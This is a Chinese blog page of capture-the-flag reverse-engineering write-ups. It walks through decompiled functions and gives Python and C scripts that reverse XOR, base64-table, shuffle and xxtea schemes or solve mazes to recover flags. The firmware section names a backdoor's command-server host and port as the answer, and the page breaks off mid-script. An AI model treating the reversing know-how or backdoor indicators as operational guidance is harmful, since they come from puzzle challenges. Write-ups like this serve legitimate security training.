id="FlareOn4-IgniteMe-x86-exe"><a href="#FlareOn4-IgniteMe-x86-exe" class="headerlink" title="[FlareOn4]IgniteMe | x86,exe"></a>[FlareOn4]IgniteMe | x86,exe</h3><p>莫得 main 函数，所有事情都在 start 函数做完，根据函数行为补一下符号：</p><p><img src="../img/FlareOn4IgniteMe/1.png" alt="FlareOn4IgniteMe"></p><p>GetInput 函数：</p><p><img src="../img/FlareOn4IgniteMe/2.png" alt="FlareOn4IgniteMe"></p><p>CheckInput：</p><p><img src="../img/FlareOn4IgniteMe/3.png" alt="FlareOn4IgniteMe"></p><p>sub_401000 函数返回一个 key 用于下面异或，该值可以静态分析，也可以动态调试，exe 没有开重定位。逻辑都很简单，直接上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">&quot;0D 26 49 45 2A 17 78 44 2B 6C 5D 5E 45 12 2F 17 2B 44 6F 6E 56 09 5F 45 47 73 26 0A 0D 13 17 48 42 01 40 4D 0C 02 69&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> target]</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">0x27</span></span><br><span class="line">key = <span class="number">0x700004</span> &amp; <span class="number">0xFF</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">flag[i] = target[i] ^ key</span><br><span class="line">key = flag[i]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag))</span><br></pre></td></tr></table></figure><br><h3 id="MRCTF2020-Xor-x86-exe"><a href="#MRCTF2020-Xor-x86-exe" class="headerlink" title="[MRCTF2020]Xor | x86,exe"></a>[MRCTF2020]Xor | x86,exe</h3><p>shift + F12，查找字符串 “Give Me Your Flag String” 的交叉引用，找到 sub_401090，其实这就是 main 函数。F5 发现报错 —— call analysis failed，这个错一般是 ida 无法正确识别 <strong>函数参数个数</strong> 或 <strong>函数调用约定</strong> 导致的。尤其是调用如 printf、scanf 这些参数个数可变的函数函数时，ida 会出现这样的错误。</p><p>出现这种情况需要看 <strong>output window</strong>，通过 log 信息知道是哪句调用分析失败了：</p><p><img src="../img/MRCTF2020Xor/1.png" alt="MRCTF2020Xor"></p><p>这里是地址 0x401095 处的调用分析失败了，此地址处调用了 sub_401020：</p><p><img src="../img/MRCTF2020Xor/2.png" alt="MRCTF2020Xor"></p><p>双击跟过去 F5 一下，让 ida 睁大眼睛好好看看这个函数，再回到 sub_401090，此时就可以 F5 了。其他题目如果做到这步还不能 F5，就需要人工干预，将光标放在函数头的位置按 ‘Y’ 强行修改参数个数或参数类型</p><p>F5 后事情就变得简单了，直接贴脚本了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">&quot;4D 53 41 57 42 7E 46 58 5A 3A 4A 3A 60 74 51 4A 22 4E 40 20 62 70 64 64 7D 38 67&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> target]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target)):</span><br><span class="line">flag += <span class="built_in">chr</span>(i ^ target[i])</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="GKCTF2020-BabyDriver-x86-sys-maze"><a href="#GKCTF2020-BabyDriver-x86-sys-maze" class="headerlink" title="[GKCTF2020]BabyDriver | x86,sys,maze"></a>[GKCTF2020]BabyDriver | x86,sys,maze</h3><p>拿到手是个驱动，想运行起来的话需要改注册表并把文件放到系统文件夹，然后重启……还好静态分析起来不难</p><p>shift + F12 查找字符串 “success! flag is flag{md5(input)}” 的交叉引用，找到函数 sub_140001380。经过分析补上一些符号：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001380</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> currentPos; <span class="comment">// ecx</span></span><br><span class="line">  __int16 *v6; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v7; <span class="comment">// rbp</span></span><br><span class="line">  __int16 v8; <span class="comment">// dx</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// dl</span></span><br><span class="line">  CHAR *v10; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(a2 + <span class="number">48</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(a2 + <span class="number">24</span>);</span><br><span class="line">    v4 = *(a2 + <span class="number">56</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      currentPos = Position;</span><br><span class="line">      v6 = (v3 + <span class="number">2</span>);</span><br><span class="line">      v7 = v4;</span><br><span class="line">      <span class="keyword">while</span> ( *(v3 + <span class="number">4</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_28:</span><br><span class="line">        v6 += <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !--v7 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">      &#125;</span><br><span class="line">      maze[currentPos] = <span class="string">&#x27;.&#x27;</span>;                   <span class="comment">// 道路</span></span><br><span class="line">      v8 = *v6;</span><br><span class="line">      <span class="keyword">if</span> ( *v6 == <span class="number">23</span> )                          <span class="comment">// up</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( currentPos &amp; <span class="number">0xFFFFFFF0</span> )          <span class="comment">// 到达上边界</span></span><br><span class="line">        &#123;</span><br><span class="line">          currentPos -= <span class="number">16</span>;                  <span class="comment">// 由此可知一行 16 个字符</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        &#125;</span><br><span class="line">        currentPos += <span class="number">208</span>;</span><br><span class="line">        Position = currentPos;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">37</span> )                           <span class="comment">// down</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (currentPos &amp; <span class="number">0xFFFFFFF0</span>) != <span class="number">208</span> ) <span class="comment">// 到达下边界</span></span><br><span class="line">        &#123;</span><br><span class="line">          currentPos += <span class="number">16</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        &#125;</span><br><span class="line">        currentPos -= <span class="number">208</span>;</span><br><span class="line">        Position = currentPos;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 == <span class="number">36</span> )                           <span class="comment">// left</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( currentPos &amp; <span class="number">0xF</span> )                 <span class="comment">// 到达左边界</span></span><br><span class="line">        &#123;</span><br><span class="line">          --currentPos;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        &#125;</span><br><span class="line">        currentPos += <span class="number">15</span>;</span><br><span class="line">        Position = currentPos;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="number">38</span> )                           <span class="comment">// right</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">      <span class="keyword">if</span> ( (currentPos &amp; <span class="number">0xF</span>) == <span class="number">15</span> )           <span class="comment">// 到达右边界</span></span><br><span class="line">        currentPos -= <span class="number">15</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        ++currentPos;</span><br><span class="line">LABEL_21:</span><br><span class="line">      Position = currentPos;</span><br><span class="line">LABEL_22:</span><br><span class="line">      v9 = maze[currentPos];</span><br><span class="line">      <span class="keyword">if</span> ( v9 == <span class="string">&#x27;*&#x27;</span> )                          <span class="comment">// 墙壁</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="string">&quot;failed!\n&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9 != <span class="string">&#x27;#&#x27;</span> )                        <span class="comment">// 终点</span></span><br><span class="line">        &#123;</span><br><span class="line">LABEL_27:</span><br><span class="line">          maze[currentPos] = <span class="string">&#x27;o&#x27;</span>;               <span class="comment">// 起点</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = <span class="string">&quot;success! flag is flag&#123;md5(v3)&#125;\n&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      Position = <span class="number">16</span>;</span><br><span class="line">      DbgPrint(v10);</span><br><span class="line">      currentPos = Position;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_29:</span><br><span class="line">  <span class="keyword">if</span> ( *(v2 + <span class="number">65</span>) )</span><br><span class="line">    *(*(v2 + <span class="number">184</span>) + <span class="number">3</span>i64) |= <span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> *(v2 + <span class="number">48</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现的功能是监听键盘按键，从而控制目标在迷宫中的移动，maze 拿出来处理一下：</p><p><img src="../img/GKCTF2020BabyDriver/1.png" alt="GKCTF2020BabyDriver"></p><p>需要注意的是，驱动判断按键用的是键盘扫描码，可以在 <a href="https://www.supfree.net/search.asp?id=6386">网站</a> 查询，37 和 38 分别对应 K 和 L，将之前的路径替换一下，再 md5：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;RDDDRRDRDDDRRRDDDRRRRRR&quot;</span></span><br><span class="line">path = path.replace(<span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">path = path.replace(<span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;K&#x27;</span>)</span><br><span class="line">md5 = hashlib.md5(path)</span><br><span class="line"><span class="built_in">print</span> md5.hexdigest()</span><br></pre></td></tr></table></figure><br><h3 id="firmware-固件分析-upx"><a href="#firmware-固件分析-upx" class="headerlink" title="firmware | 固件分析,upx"></a>firmware | 固件分析,upx</h3><p>拿到一个路由器固件，<code>binwalk -e</code> 分离得到一个压缩的文件系统 <strong>120200.squashfs</strong> ：</p><p><img src="../img/firmware/1.png" alt="firmware"></p><p>需要用到 <a href="https://github.com/mirror/firmware-mod-kit.git">firmware-mod-kit</a> 解压，安装方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mirror/firmware-mod-kit.git</span><br><span class="line"><span class="built_in">cd</span> firmware-mod-kit/src</span><br><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>使用指令 <code>./unsquashfs_all.sh 120200.squashfs</code> 解压文件系统，得到文件夹 <strong>squashfs-root</strong>，翻一下里面的文件，在 tmp 目录下发现可执行文件 backdoor，且被 upx 压缩了。upx 解压后 ida 打开，找到 initConnection 函数：</p><p><img src="../img/firmware/2.png" alt="firmware"></p><p>commServer 是 echo.byethost51.com，端口为 36667</p><br><h3 id="MRCTF2020-hello-world-go-x86-elf-go语言"><a href="#MRCTF2020-hello-world-go-x86-elf-go语言" class="headerlink" title="[MRCTF2020]hello_world_go | x86,elf,go语言"></a>[MRCTF2020]hello_world_go | x86,elf,go语言</h3><p>main.main 函数：</p><p><img src="../img/MRCTF2020hello_world_go/1.png" alt="MRCTF2020hello_world_go"></p><p>unk_4D3C58 即为 flag</p><br><h3 id="FlareOn6-Overlong-x86-exe-patch"><a href="#FlareOn6-Overlong-x86-exe-patch" class="headerlink" title="[FlareOn6]Overlong | x86,exe,patch"></a>[FlareOn6]Overlong | x86,exe,patch</h3><p>start 函数里弹了一个对话框，对话框的内容由 PrepareText 函数处理：</p><p><img src="../img/FlareOn6Overlong/1.png" alt="FlareOn6Overlong"></p><p>将第三个参数 patch 成 127 再运行就能得到 flag（或者动态调试把传参修改一下）</p><br><h3 id="WUSTCTF2020-level3-x86-elf-elf运行流程"><a href="#WUSTCTF2020-level3-x86-elf-elf运行流程" class="headerlink" title="[WUSTCTF2020]level3 | x86,elf,elf运行流程"></a>[WUSTCTF2020]level3 | x86,elf,elf运行流程</h3><p>main 函数逻辑清晰，要求对 d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD== 进行 base64 解密。但是在 main 函数执行前，base 编码表被函数 O_OLookAtYou 做了手脚，该函数在 _init_array 数组中，会在 main 函数之前被执行：</p><p><img src="../img/WUSTCTF2020level3/1.png" alt="WUSTCTF2020level3"></p><p>elf 运行流程详见本文 <strong>[2019红帽杯]easyRE</strong> writeup</p><p>动态调试将新的编码表拿出来：</p><p><img src="../img/WUSTCTF2020level3/2.png" alt="WUSTCTF2020level3"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">new_table = <span class="string">&quot;TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line"></span><br><span class="line">general = <span class="string">&#x27;&#x27;</span></span><br><span class="line">target = <span class="string">&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target :</span><br><span class="line">general += old_table[new_table.find(i)]</span><br><span class="line"><span class="built_in">print</span> base64.b64decode(general)</span><br></pre></td></tr></table></figure><br><h3 id="WUSTCTF2020-Cr0ssfun-x86-elf"><a href="#WUSTCTF2020-Cr0ssfun-x86-elf" class="headerlink" title="[WUSTCTF2020]Cr0ssfun | x86,elf"></a>[WUSTCTF2020]Cr0ssfun | x86,elf</h3><p>check 函数对 flag 的每个字符进行判断，提出来拼在一起就可以了，使用 sublime 的正则替换功能会高效很多</p><br><h3 id="GXYCTF2019-simple-CPP-x86-exe-反调试"><a href="#GXYCTF2019-simple-CPP-x86-exe-反调试" class="headerlink" title="[GXYCTF2019]simple CPP | x86,exe,反调试"></a>[GXYCTF2019]simple CPP | x86,exe,反调试</h3><p>晚点再写~</p><br><h3 id="2019红帽杯-xx-x86-exe-xxtea"><a href="#2019红帽杯-xx-x86-exe-xxtea" class="headerlink" title="[2019红帽杯]xx | x86,exe,xxtea"></a>[2019红帽杯]xx | x86,exe,xxtea</h3><p>PS. 本题所有脚本语言环境为 C/C++</p><p>sub_1400011A0 是 main 函数（通过字符串交叉引用找到），干了几件事：</p><ul><li>输入 19 个字符</li><li>前 4 个字符作为 key</li><li>调用 sub_140001AB0 函数（xxtea_encode）加密输入，密钥为 key，加密结果记为 r1</li><li>轮换加密 r1，加密结果记为 r2</li><li>for 循环从 r2 第三个字符开始逐字节异或加密 r2，加密结果记为 r3</li><li>r3 应该与一个长度为 24 字节的数组逐字节相等，输出 You win</li></ul><p>r2 加密到 r3 的逻辑用 C 可以写作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encode3</span><span class="params">(<span class="keyword">char</span>* input)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">24</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (i / <span class="number">3</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">char</span> tmp = input[i];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">tmp ^= input[idx++];</span><br><span class="line">&#125; <span class="keyword">while</span> (idx &lt; i / <span class="number">3</span>);</span><br><span class="line">input[i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>故r3 还原 r2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decode3</span><span class="params">(<span class="keyword">char</span>* input)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">23</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="keyword">int</span> idx = i / <span class="number">3</span> - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (i / <span class="number">3</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">char</span> tmp = input[i];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">tmp ^= input[idx--];</span><br><span class="line">&#125; <span class="keyword">while</span> (idx &gt;= <span class="number">0</span>);</span><br><span class="line">input[i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>r1 到 r2 的轮换加密 F5 反编译得很清楚，下面是 r2 还原 r1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decode2</span><span class="params">(<span class="keyword">char</span>* cipher, <span class="keyword">char</span>* plain)</span> </span>&#123;</span><br><span class="line">plain[<span class="number">2</span>] = cipher[<span class="number">0</span>];</span><br><span class="line">plain[<span class="number">0</span>] = cipher[<span class="number">1</span>];</span><br><span class="line">plain[<span class="number">3</span>] = cipher[<span class="number">2</span>];</span><br><span class="line">plain[<span class="number">1</span>] = cipher[<span class="number">3</span>];</span><br><span class="line">plain[<span class="number">6</span>] = cipher[<span class="number">4</span>];</span><br><span class="line">plain[<span class="number">4</span>] = cipher[<span class="number">5</span>];</span><br><span class="line">plain[<span class="number">7</span>] = cipher[<span class="number">6</span>];</span><br><span class="line">plain[<span class="number">5</span>] = cipher[<span class="number">7</span>];</span><br><span class="line">plain[<span class="number">10</span>] = cipher[<span class="number">8</span>];</span><br><span class="line">plain[<span class="number">8</span>] = cipher[<span class="number">9</span>];</span><br><span class="line">plain[<span class="number">11</span>] = cipher[<span class="number">10</span>];</span><br><span class="line">plain[<span class="number">9</span>] = cipher[<span class="number">11</span>];</span><br><span class="line">plain[<span class="number">14</span>] = cipher[<span class="number">12</span>];</span><br><span class="line">plain[<span class="number">12</span>] = cipher[<span class="number">13</span>];</span><br><span class="line">plain[<span class="number">15</span>] = cipher[<span class="number">14</span>];</span><br><span class="line">plain[<span class="number">13</span>] = cipher[<span class="number">15</span>];</span><br><span class="line">plain[<span class="number">18</span>] = cipher[<span class="number">16</span>];</span><br><span class="line">plain[<span class="number">16</span>] = cipher[<span class="number">17</span>];</span><br><span class="line">plain[<span class="number">19</span>] = cipher[<span class="number">18</span>];</span><br><span class="line">plain[<span class="number">17</span>] = cipher[<span class="number">19</span>];</span><br><span class="line">plain[<span class="number">22</span>] = cipher[<span class="number">20</span>];</span><br><span class="line">plain[<span class="number">20</span>] = cipher[<span class="number">21</span>];</span><br><span class="line">plain[<span class="number">23</span>] = cipher[<span class="number">22</span>];</span><br><span class="line">plain[<span class="number">21</span>] = cipher[<span class="number">23</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>r1 到明文输入的解密需要 xxtea_decode，这里我使用了别人写好的项目 <a href="https://github.com/xxtea/xxtea-c">github xxtea</a>，VS 里导入就能用了。key 因为取的是开头 4 个字符，所以直接猜 “flag”，下面是解密脚本的 main 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;xxtea.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// r3 -&gt; r2</span></span><br><span class="line"><span class="keyword">char</span> r3[]&#123; <span class="number">0xCE</span>, <span class="number">0xBC</span>, <span class="number">0x40</span>, <span class="number">0x6B</span>, <span class="number">0x7C</span>, <span class="number">0x3A</span>, <span class="number">0x95</span>, <span class="number">0xC0</span>, <span class="number">0xEF</span>, <span class="number">0x9B</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0xF7</span>, <span class="number">0x02</span>, <span class="number">0x35</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0xC8</span>, <span class="number">0xE7</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0xFA</span> &#125;;</span><br><span class="line">Decode3(r3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// r2 -&gt; r1</span></span><br><span class="line"><span class="keyword">char</span> r1[<span class="number">24</span>];</span><br><span class="line">Decode2(r3, r1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// r1 -&gt; 明文</span></span><br><span class="line"><span class="keyword">size_t</span> len = <span class="number">24</span>;</span><br><span class="line"><span class="keyword">char</span> key[] = &#123; <span class="string">&quot;flag&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">char</span>* plain = (<span class="keyword">char</span> *)xxtea_decrypt(r1, len, key, &amp;len);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; plain &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="ACTF新生赛2020-Oruga-x86-elf-maze"><a href="#ACTF新生赛2020-Oruga-x86-elf-maze" class="headerlink" title="[ACTF新生赛2020]Oruga | x86,elf,maze"></a>[ACTF新生赛2020]Oruga | x86,elf,maze</h3><p>main 函数前面在检查输入前 5 个字符是不是 “actf{“，然后调用 sub_78A 来检查 flag 内容。该函数可以理解成一个类似滑动冰壶的游戏，冰壶在冰面上滑动，不碰到墙壁就停不下来：</p><p><img src="../img/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020Oruga/1.png" alt="ACTF新生赛2020Oruga"></p><p>如果不是很理解，可以玩下这个 <a href="http://www.4399.com/flash/213575_1.htm">4399 滑动海绵漆</a></p><p>map 中的 0 表示冰面，感叹号表示终点，其他字符表示墙壁。把 map 拿出来处理一下，0 替换成 * 方便观察：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">maze = <span class="string">&quot;00 00 00 00 23 00 00 00 00 00 00 00 23 23 23 23 00 00 00 23 23 00 00 00 4F 4F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 4F 4F 00 50 50 00 00 00 00 00 00 4C 00 4F 4F 00 4F 4F 00 50 50 00 00 00 00 00 00 4C 00 4F 4F 00 4F 4F 00 50 00 00 00 00 00 00 4C 4C 00 4F 4F 00 00 00 00 50 00 00 00 00 00 00 00 00 00 4F 4F 00 00 00 00 50 00 00 00 00 23 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 23 00 00 00 00 00 00 00 00 00 4D 4D 4D 00 00 00 23 00 00 00 00 00 00 00 00 00 00 4D 4D 4D 00 00 00 00 45 45 00 00 00 30 00 4D 00 4D 00 4D 00 00 00 00 45 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 45 45 54 54 54 49 00 4D 00 4D 00 4D 00 00 00 00 45 00 00 54 00 49 00 4D 00 4D 00 4D 00 00 00 00 45 00 00 54 00 49 00 4D 00 4D 00 4D 21 00 00 00 45 45&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">maze = [<span 